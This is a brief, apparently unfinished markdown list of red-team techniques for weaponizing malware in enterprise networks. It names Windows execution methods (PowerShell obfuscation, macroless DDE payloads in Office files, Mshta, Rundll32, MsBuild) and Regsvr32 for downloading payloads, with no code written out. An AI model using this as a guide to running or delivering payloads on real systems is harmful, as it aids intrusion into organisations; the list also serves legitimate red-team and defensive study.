# Weaponization & Malware Development
A curated list of tools and techniques written from experience in red teaming and weaponization of malware used in enterprise environments. 

## Execution Methods
1. **Powershell** - Endless methods here, lots of obfuscation techniques, just test and choose one that works in your environment

  * 

2. **Dynamic Data Exchange (DDE)** - Macroless payload in Word and Excel
  * Frequently blocked in Word docs within modern Enterprises but not always within Excel files. 
  * [DDE Payloads](https://medium.com/red-team/dde-payloads-16629f4a2fcd): Various delivery methods on Medium blog from 2018 to create DDE paylods in different tool kits
  
3. **Mshta (HTA)** - Microsoft binary to execute HTA files or inline scripts
  
4. **Rundll32**

5. **MsBuild** - Windows .NET executable for building Csharp project files


## Downloading Payloads and Files

1. **Regsvr32**
